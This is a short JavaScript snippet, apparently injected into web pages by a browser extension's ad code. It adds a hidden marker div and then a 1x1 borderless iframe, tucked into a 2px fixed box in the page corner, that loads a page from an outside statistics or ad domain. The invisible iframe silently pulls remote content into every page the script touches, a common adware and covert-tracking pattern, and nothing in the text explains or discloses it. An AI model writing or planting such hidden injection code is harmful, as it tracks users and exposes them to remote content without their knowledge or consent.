(function(){
	var alreayRun = false;
	if(true)
	{
		if(document.getElementById("rili_ext_ads_mutex"))
		{
			alreayRun = true;
		}
		else
		{
			//create
			var divMutex=document.createElement("div");
			divMutex.style.cssText="width:1px;height:1px;position:fixed;z-index:0;";
			divMutex.setAttribute("id","rili_ext_ads_mutex");
			document.body.appendChild(divMutex);
		}			
	}
	
	if(!alreayRun)
	{
	
	var ifr = document.createElement("iframe");
	ifr.setAttribute("src","//tongji.398yuer.com/cnzz5.html");
	ifr.setAttribute("width","1");
	ifr.setAttribute("height","1");
	ifr.setAttribute("scrolling","no");
	ifr.setAttribute("frameborder","0");
	var ov1=document.createElement("div");
	ov1.style.cssText="width:2px;height:2px;position:fixed;z-index:12;bottom: 15px;right: 15px;";
	ov1.appendChild(ifr);
	document.body.appendChild(ov1);
	}})();